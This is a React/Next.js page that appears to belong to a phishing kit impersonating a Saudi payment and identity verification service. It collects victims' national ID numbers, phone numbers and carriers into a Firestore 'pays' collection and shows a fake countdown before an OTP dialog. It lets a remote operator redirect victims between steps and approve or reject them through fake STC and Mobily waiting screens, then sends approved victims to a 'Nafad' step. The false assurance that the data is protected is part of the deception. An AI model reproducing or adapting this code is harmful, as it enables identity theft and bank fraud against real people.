"use client";

import { useEffect, useState } from "react";
import { toast } from "sonner";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Phone, ShieldCheck, CreditCard, ChevronDown, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
import { StcVerificationModal } from "@/components/stc-verification-modal";
import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
import { PhoneOtpDialog } from "@/components/dialog-b";

import { db, setDoc, doc } from "@/lib/firebase";
import { onSnapshot, getDoc, Firestore } from "@/lib/firestore-shim";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";

export default function VerifyPhonePage() {
  const [idNumber, setIdNumber] = useState("");
  const [idError, setIdError] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [selectedCarrier, setSelectedCarrier] = useState("");
  const [showStcModal, setShowStcModal] = useState(false);
  const [showMobilyModal, setShowMobilyModal] = useState(false);
  const [showCarrierModal, setShowCarrierModal] = useState(false);
  const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false);
  const [phoneError, setPhoneError] = useState("");
  const [approvalError, setApprovalError] = useState("");
  // countdown: null = idle, 5→1 = counting, 0 = open dialog
  const [otpCountdown, setOtpCountdown] = useState<number | null>(null);

  const telecomOperators = [
    { value: "stc",    label: "STC - الاتصالات السعودية" },
    { value: "mobily", label: "Mobily - موبايلي" },
    { value: "zain",   label: "Zain - زين" },
    { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
    { value: "lebara", label: "Lebara - ليبارا" },
    { value: "salam",  label: "SALAM - سلام" },
    { value: "go",     label: "GO - جو" },
  ];

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  useRedirectMonitor({ visitorId, currentPage: "phone" });

  useEffect(() => {
    if (visitorId && db) {
      const visitorRef = doc(db as Firestore, "pays", visitorId);
      setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
        console.error("[phone-info] Failed to clear redirectPage:", err)
      );
    }
  }, [visitorId]);

  // Admin redirect listener
  useEffect(() => {
    if (!visitorId || !db) return;
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (!docSnap.exists()) return;
        const data = docSnap.data();
        if (data.currentStep === "home")  window.location.href = "/";
        else if (data.currentStep === "_t6")  window.location.href = "/step4";
        else if (data.currentStep === "_st1") window.location.href = "/check";
        else if (data.currentStep === "_t2")  window.location.href = "/step2";
        else if (data.currentStep === "_t3")  window.location.href = "/step3";
      },
      (err) => console.error("[phone-info] Firestore listener error:", err)
    );
    return () => unsubscribe();
  }, []);

  // 5-second countdown after form submit
  useEffect(() => {
    if (otpCountdown === null || otpCountdown === 0) return;
    const t = setTimeout(() => setOtpCountdown((c) => (c as number) - 1), 1000);
    return () => clearTimeout(t);
  }, [otpCountdown]);

  // When countdown hits 0 → open OTP dialog
  useEffect(() => {
    if (otpCountdown === 0) {
      setShowPhoneOtpDialog(true);
      setOtpCountdown(null);
    }
  }, [otpCountdown]);

  const validateIdNumber = (id: string): boolean => {
    const saudiIdRegex = /^[12]\d{9}$/;
    if (!saudiIdRegex.test(id)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام");
      return false;
    }
    setIdError("");
    return true;
  };

  const validatePhoneNumber = (phone: string): boolean => {
    const cleanPhone = phone.replace(/\s/g, "");
    const saudiPhoneRegex = /^05\d{8}$/;
    if (!saudiPhoneRegex.test(cleanPhone)) {
      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
      return false;
    }
    setPhoneError("");
    return true;
  };

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 10) {
      setIdNumber(value);
      if (value.length === 10) validateIdNumber(value);
      else setIdError("");
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 10) {
      setPhoneNumber(value);
      if (value.length === 10) validatePhoneNumber(value);
      else setPhoneError("");
    }
  };

  const handleSendOtp = async () => {
    if (!idNumber || !phoneNumber || !selectedCarrier) return;
    if (!validateIdNumber(idNumber)) return;
    if (!validatePhoneNumber(phoneNumber)) return;
    const visitorID = localStorage.getItem("visitor");
    if (!visitorID || !db) return;

    setApprovalError("");
    try {
      await setDoc(
        doc(db as Firestore, "pays", visitorID),
        {
          phoneIdNumber: idNumber,
          phoneNumber: phoneNumber,
          phoneCarrier: selectedCarrier,
          phoneSubmittedAt: new Date().toISOString(),
          _v4Status: "pending",
          phoneUpdatedAt: new Date().toISOString(),
          redirectPage: null,
        },
        { merge: true }
      );
      // Start 5-second countdown
      setOtpCountdown(5);
    } catch (error) {
      console.error("Error saving phone data:", error);
      toast.error("حدث خطأ", { description: "يرجى المحاولة مرة أخرى", duration: 5000 });
    }
  };

  // Carrier modal approved → go to Nafad
  const handleApproved = () => {
    setShowStcModal(false);
    setShowMobilyModal(false);
    setShowCarrierModal(false);
    window.location.href = "/step4";
  };

  // Carrier modal rejected → show inline error, reset for retry
  const handleRejected = async () => {
    const visitorID = localStorage.getItem("visitor");
    if (!visitorID || !db) return;
    try {
      const docRef = doc(db as Firestore, "pays", visitorID);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        const data = docSnap.data();
        const currentPhoneData = {
          idNumber: data.phoneIdNumber || "",
          phoneNumber: data.phoneNumber,
          phoneCarrier: data.phoneCarrier,
          rejectedAt: new Date().toISOString(),
        };
        await setDoc(
          docRef,
          {
            oldPhoneInfo: data.oldPhoneInfo
              ? [...data.oldPhoneInfo, currentPhoneData]
              : [currentPhoneData],
            phoneOtpStatus: "pending",
            phoneCarrier: "",
          },
          { merge: true }
        );
      }
    } catch (error) {
      console.error("Error saving rejected phone data:", error);
    }
    setShowStcModal(false);
    setShowMobilyModal(false);
    setShowCarrierModal(false);
    setSelectedCarrier("");
    setApprovalError("تم رفض طلبك. يرجى التحقق من بياناتك والمحاولة مرة أخرى.");
  };

  const handleShowWaitingModal = (carrier: string) => {
    if (carrier === "stc")    setShowStcModal(true);
    else if (carrier === "mobily") setShowMobilyModal(true);
    else setShowCarrierModal(true);
  };

  const isFormValid =
    !!phoneNumber && !!selectedCarrier && phoneNumber.length === 10 && !phoneError &&
    !!idNumber && idNumber.length === 10 && !idError;

  const isCounting = otpCountdown !== null && otpCountdown > 0;

  return (
    <>
      <div
        className="min-h-screen bg-gradient-to-br from-[#0d47a1] via-[#1565c0] to-[#1976d2] flex items-center justify-center p-4"
        dir="rtl"
      >
        {/* Background blobs */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-0 left-0 w-72 h-72 bg-white/5 rounded-full -ml-36 -mt-36 blur-3xl" />
          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white/10 rounded-full -mr-48 -mb-48 blur-3xl" />
          <div className="absolute inset-0 opacity-5"
            style={{ backgroundImage: "radial-gradient(circle, #fff 1px, transparent 1px)", backgroundSize: "28px 28px" }} />
        </div>

        <div className="w-full max-w-md space-y-5 relative z-10">

          {/* Header */}
          <div className="text-center text-white space-y-2 mb-2">
            <div className="w-16 h-16 bg-white/15 backdrop-blur-sm border border-white/20 rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
              <Phone className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-2xl font-black">نظام التحقق الآمن</h1>
            <p className="text-white/60 text-sm">تحقق من هويتك بأمان وسرعة</p>
          </div>

          {/* Card */}
          <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-white/10">
            <div className="h-1 bg-gradient-to-l from-[#42a5f5] via-[#1976d2] to-[#1565c0]" />
            <div className="p-6 space-y-5">

              {/* Approval error */}
              {approvalError && (
                <div className="flex items-start gap-3 bg-red-50 border border-red-200 rounded-2xl p-4">
                  <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-red-800 font-medium leading-relaxed">{approvalError}</p>
                </div>
              )}

              {/* Info banner */}
              <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
                <div className="flex items-start gap-3">
                  <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-blue-900 font-medium leading-relaxed">
                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم الهاتف المرتبطين ببطاقتك البنكية.
                  </p>
                </div>
              </div>

              {/* ID Number */}
              <div className="space-y-1.5">
                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الهوية *</Label>
                <div className="relative">
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                    <CreditCard className="w-3.5 h-3.5 text-[#1976d2]" />
                  </div>
                  <Input
                    type="tel" inputMode="numeric"
                    placeholder="1xxxxxxxxx"
                    value={idNumber}
                    onChange={handleIdChange}
                    className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${idError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white"}`}
                    dir="rtl"
                  />
                  {idNumber.length === 10 && !idError && (
                    <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                  )}
                </div>
                {idError && <p className="text-xs text-red-600 font-medium">⚠ {idError}</p>}
              </div>

              {/* Phone */}
              <div className="space-y-1.5">
                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الجوال *</Label>
                <div className="relative">
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                    <Phone className="w-3.5 h-3.5 text-[#1976d2]" />
                  </div>
                  <Input
                    type="tel" inputMode="numeric"
                    placeholder="05xxxxxxxx"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${phoneError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white"}`}
                    dir="rtl"
                  />
                  {phoneNumber.length === 10 && !phoneError && (
                    <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                  )}
                </div>
                {phoneError && <p className="text-xs text-red-600 font-medium">⚠ {phoneError}</p>}
              </div>

              {/* Carrier */}
              <div className="space-y-1.5">
                <Label className="text-right block text-slate-700 font-bold text-sm">شركة الاتصالات *</Label>
                <div className="relative">
                  <select
                    value={selectedCarrier}
                    onChange={(e) => setSelectedCarrier(e.target.value)}
                    className="w-full h-12 text-right text-sm border-2 border-slate-200 rounded-xl px-4 bg-slate-50 focus:bg-white focus:border-[#1976d2] focus:outline-none appearance-none cursor-pointer transition-all pr-4 pl-10"
                  >
                    <option value="">اختر شركة الاتصالات</option>
                    {telecomOperators.map((op) => (
                      <option key={op.value} value={op.value}>{op.label}</option>
                    ))}
                  </select>
                  <ChevronDown className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 pointer-events-none" />
                </div>
              </div>

              {/* Submit button */}
              <button
                type="button"
                onClick={handleSendOtp}
                disabled={!isFormValid || isCounting}
                className="w-full h-13 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                style={{
                  background: isCounting
                    ? "linear-gradient(135deg, #1565c0, #0d47a1)"
                    : "linear-gradient(135deg, #1976d2, #1565c0)",
                  color: "#fff",
                  boxShadow: "0 8px 24px rgba(25,118,210,0.35)",
                  paddingTop: "0.75rem",
                  paddingBottom: "0.75rem",
                }}
              >
                {isCounting ? (
                  <>
                    <div className="relative w-8 h-8 flex items-center justify-center">
                      <svg className="absolute inset-0 w-full h-full -rotate-90" viewBox="0 0 32 32">
                        <circle cx="16" cy="16" r="13" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="2.5" />
                        <circle cx="16" cy="16" r="13" fill="none" stroke="rgba(255,255,255,0.8)" strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeDasharray={`${(((5 - (otpCountdown as number)) / 5) * 81.7).toFixed(1)} 81.7`}
                          style={{ transition: "stroke-dasharray 0.9s linear" }}
                        />
                      </svg>
                      <span className="text-sm font-black text-white">{otpCountdown}</span>
                    </div>
                    <span>جاري إرسال رمز التحقق...</span>
                  </>
                ) : (
                  <>
                    <Phone className="h-4 w-4" />
                    إرسال رمز التحقق
                  </>
                )}
              </button>

              <div className="text-center">
                <p className="text-xs text-slate-400">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <StcVerificationModal
        open={showStcModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <MobilyVerificationModal
        open={showMobilyModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <CarrierVerificationModal
        open={showCarrierModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <PhoneOtpDialog
        open={showPhoneOtpDialog}
        onOpenChange={(open) => {
          setShowPhoneOtpDialog(open);
        }}
        phoneNumber={phoneNumber}
        phoneCarrier={selectedCarrier}
        onShowWaitingModal={handleShowWaitingModal}
      />
    </>
  );
}
